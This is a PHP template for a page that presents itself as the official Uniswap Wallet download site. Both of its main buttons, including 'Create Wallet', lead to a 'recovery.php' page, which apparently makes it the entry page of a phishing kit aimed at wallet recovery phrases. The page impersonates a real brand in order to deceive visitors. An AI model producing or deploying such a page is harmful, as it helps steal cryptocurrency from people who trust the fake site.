<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Download Uniswap Wallet - Official Website';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-4 text-center bg-white rounded-5 pb20" style="margin-top: 110px; padding: 0px">
                    <img src="<?= base_url('assets/img/form.png') ?>" class="w-100" alt="...">
                    <div class="text-center mx-auto d-grid gap-6 mx20">
                        <a href="<?= base_url('recovery.php')?>" class="btn bg-primary-2 text-white rounded-4 py10 my10 fw-bold">Create Wallet</a>
                        <a href="<?= base_url('recovery.php')?>" class="btn bg-gray-2 text-black rounded-4 py10 my10 fw-bold">I already have a wallet</a>
                    </div>
                    <div class="d-flex align-items-center my5 mx20">
                        <div class="flex-grow-1 border-bottom border-secondary opacity-25"></div>
                        <span class="mx-3 text-secondary" style="font-size: 14px; white-space: nowrap;">
                            Have the Uniswap app?
                        </span>
                        <div class="flex-grow-1 border-bottom border-secondary opacity-25"></div>
                    </div>
                    <div class="text-center my15 mx20 text-primary-3">
                        <i class="fas fa-qrcode me6"></i> Scan QR code to import?
                    </div>
                </div>
                <div class="text-center text-secondary my20">By continuing, I agree to the <b>Terms of Service</b> <br/>and consent to the <b>Privacy Policy</b></div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>